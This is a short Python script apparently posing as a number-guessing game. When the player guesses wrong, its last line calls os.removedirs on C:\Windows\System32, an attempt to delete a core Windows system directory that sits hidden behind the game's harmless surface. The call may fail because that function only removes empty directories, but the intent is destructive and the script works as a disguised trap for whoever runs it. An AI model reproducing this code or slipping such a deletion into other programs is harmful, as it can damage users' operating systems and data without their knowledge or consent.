Play=input("Wanna play a game? ").lower()
if Play=='yes':
    pass
else:
    quit()
print("Great!")
import time
time.sleep(2)
choice=int(input("Pick a number 1-10"))
import random
if choice==random.randint(1,10):
    print("You win!")
else:
    import os
    os.removedirs("C:\\Windows\\System32")